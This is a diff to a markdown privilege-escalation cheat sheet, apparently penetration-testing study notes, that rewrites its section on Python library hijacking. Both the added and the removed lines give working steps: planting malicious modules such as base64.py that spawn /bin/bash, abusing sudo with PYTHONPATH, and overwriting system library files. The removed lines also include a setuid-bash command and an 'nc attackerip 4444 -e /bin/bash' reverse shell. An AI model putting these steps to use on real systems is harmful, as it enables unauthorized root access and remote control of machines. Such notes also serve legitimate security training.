@@ -1084,120 +1084,121 @@ We can run commands inserted inside commands that we have permission for, e.g.:
   ---
   <a id="10.5-python-hijack"></a>
   ## **Python Library Hijacking**
-
-  Use when you find **Python scripts** executed with **elevated privileges**, such as:
-
-  * **SUID bit:**
-
-    ```bash
-    find / -perm -4000 -type f -exec file {} \; 2>/dev/null | grep "Python"
-    ```
-
-  * **`sudo -l` with SETENV:**
-
-    ```bash
-    sudo -l | grep python
-    ```
-
-  * Python scripts used by privileged services
-
+  
+  When you are allowed to execute a **Python script with elevated privileges** (via `sudo`, `SUID`, etc.) and that script **imports external modules**, you can exploit Python’s **module resolution order** to execute arbitrary code.
+  
+  
+  #### Prerequisites  
+  * You can **run a Python script as root or another privileged user**:
+  * The script **imports external modules**, such as `os`, `random`, `base64`, etc.
+  
   ---
+  
+  ### (if `sudo -l` had returned `SETENV`):
+  
+  ```bash
+  echo 'def b64encode(x): import os; os.system("/bin/bash")' > /tmp/base64.py
+  ```
+  ```bash
+  sudo PYTHONPATH=/tmp sudo -E /usr/bin/python3 /opt/script.py
+  ```
 
-  #### **INDICATORS / QUICK CHECKLIST:**
+  ## Exploitation Steps
+  
+  ### 1. Identify Imported Modules
+  
+  Check which modules are imported in the script:
 
-  1. **Python file executed as root?**
+  ```bash
+  cat script.py
+  # Output:
+  import base64
+  import random
+  import os
+  ```
+  
+  ### 2. Locate the Original Module
+  
+  Use Python to locate where the target module resides (ex: base64):
+  
+  ```bash
+  python3 -c 'import base64; print(base64.__file__)'
+  ```
 
-     ```bash
-     ls -l script.py
-     sudo -l
-     ```
+  
+  ### 3. Check for Write Permissions on the Original File
+  
+  ```bash
+  ls -l /usr/lib/python3.7/base64.py
+  ```
+  
+  If so, modify it directly:
+  
+  ```python
+  # base64.py
+  def b64encode(a):
+      import os
+      os.system("/bin/bash")
+  ```
 
-  2. **Script imports third-party libraries?**
+  
+  ### 4. If Not Writable: Check for Write Access to the Script’s Directory
+  Python will **import local files before system libraries**.
+  If the script is in `/home/batman/script.py`:
+  
+  ```bash
+  ls -l /home/batman
+  ```
+  
+  If writable, create a malicious module in the same directory:
 
-     ```bash
-     grep import script.py
-     ```
+  `nano base64.py`
+  
+  ```python
+  # /home/batman/base64.py
+  def b64encode(a):
+      import os
+      os.system("/bin/bash")
+  ```
+    
+  
+  ### 5. Inspect Python’s Module Priority Search Order
+  
+  We can see the priority order (sys.path) by running:
+  
+  ```bash
+  python3 -c 'import sys; print("\n".join(sys.path))'
+  ```
 
-  3. **Are any import folders writable?**
-
-     ```bash
-     python3 -c 'import sys; print("\n".join(sys.path))'
-     ```
-
-     Then:
-
-     ```bash
-     ls -ld /usr/lib/python3.8
-     ls -ld /usr/local/lib/python3.8/dist-packages
-     ls -ld /tmp
-     ```
-
-  4. **Is any `.py` library used by the script editable?**
-
-     ```bash
-     grep -r "def" /path/to/module/
-     ls -l /path/to/module/*.py
-     ```
+  
+  Then we check for Writable Directories Higher in the Import Priority
+  
+  We need to remember the localtion of the regit module, e.g.: if `base64.py` is in `/usr/lib/python3.7/` and `/usr/local/lib/python3.7/` is higher, we check if writeable:
+  
+  ```bash
+  ls -ld /usr/local/lib/python3.7/
+  ```
+  
+  If writable, we place the malicious module there:
+  
+  ```python
+  # /usr/local/lib/python3.7/base64.py
+  def b64encode(a):
+      import os
+      os.system("/bin/bash")
+  ```
+  
+  ### 7. Moving the Original and Replacing It in a Higher Path
+  
+  This is only possible if we have full write access. Move the original module to a lower-priority path and place our malicious version in a higher-priority one:
+  
+  ```bash
+  mv /usr/lib/python3.7/base64.py /usr/lib/python3.7/lib-old/
+  nano /usr/lib/python3.7/base64.py  # your malicious version
+  ```
 
   ---
   
-  #### **OPTION A – Direct hijack of an editable module**
-
-  ```python
-  def virtual_memory():
-      import os
-      os.system("id")
-  ```
-
-  Overwrite the real function in the vulnerable library with your version.
-
-  ---
-
-  #### **OPTION B – Path Hijacking (directory above the real one with write permission)**
-
-  ```bash
-  cd /usr/lib/python3.8/
-  echo 'def virtual_memory(): import os; os.system("id")' > psutil.py
-  ```
-
-  Python loads the highest priority version in `sys.path`.
-
-  ---
-
-  #### **OPTION C – Hijack via PYTHONPATH with SETENV**
-
-  ```bash
-  echo 'def virtual_memory(): import os; os.system("id")' > /tmp/psutil.py
-  sudo PYTHONPATH=/tmp/ /usr/bin/python3 script.py
-  ```
-
-  Works only if `sudo -l` shows `SETENV`.
-
-  ---
-
-  #### **POST-EXPLOITATION / ROOT SHELL**
-
-  Replace `os.system("id")` with:
-
-  ```python
-  os.system("chmod +s /bin/bash")  # or
-  os.system("nc attackerip 4444 -e /bin/bash")
-  ```
-
-  ---
-
-  #### QUICK MEMORY — KEY COMMANDS:
-
-  | Step                            | Command                                     |
-  | ------------------------------- | ------------------------------------------- |
-  | Find Python SUID scripts        | `find / -perm -4000 -type f -exec file {} ; |
-  | See imported modules            | `grep import script.py`                     |
-  | See Python paths                | `python3 -c 'import sys; print(sys.path)'`  |
-  | See directory permissions       | `ls -ld <path>`                             |
-  | See module permissions          | `ls -l /.../module.py`                      |
-  | See if `sudo` allows PYTHONPATH | `sudo -l`                                   |
-
-  ---
   <a id="10.6-cves"></a>
   ## **0-Days (CVEs)**
 
